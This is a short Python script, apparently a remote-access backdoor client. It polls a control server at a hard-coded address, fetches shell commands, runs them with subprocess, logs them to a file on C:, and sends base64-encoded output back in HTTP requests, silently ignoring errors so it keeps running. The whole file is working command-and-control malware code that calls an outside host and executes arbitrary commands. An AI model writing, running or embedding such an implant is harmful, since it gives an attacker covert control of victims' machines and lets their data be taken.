import time
import socket
import subprocess
import requests
import os

def get_string_from_command(command):
    # 不能执行which nihao,这样不会有输出,可nihao得到输出
    # 执行成功的命令有正常输出,执行不成功的命令得不到输出,得到输出为””,eg.command=which nihao
    # 判断程序有没有已经安装可eg.get_string_from_command(“sqlmap —help”)
    return subprocess.getstatusoutput(command)[1]

def base64encodeStr(string):
    # 得到base64的字符串
    # 输入为str类型
    # 返回为str类型
    import base64
    bytes_string = (string).encode(encoding="utf-8")
    bytesbase64Str = base64.b64encode(bytes_string)
    base64Str = bytesbase64Str.decode()
    return base64Str


addrs = socket.getaddrinfo(socket.gethostname(),None)
self_ip=[item[4][0] for item in addrs if ':' not in item[4][0]][0]
server_address = 'http://192.168.40.129:8080/'

while True:
    time.sleep(1)
    try:
        result = requests.get(
            server_address + "?ip=%s&action=askbecontroled" % self_ip)
        result = result.content.decode("utf8")
        if result == "ok":
            while True:
                order = requests.get(
                    server_address + "?ip=%s&action=askfororder" % self_ip).content.decode("utf8")
                with open("c:\\order.txt","a+") as f:
                    f.write(order+"\n")
                if order == "bye":
                    break
                command_result=get_string_from_command(order)
                result = base64encodeStr(command_result)
                requests.get(
                    server_address + "?ip=%s&action=returnresult&result=%s" % (self_ip, result))
    except:
        pass
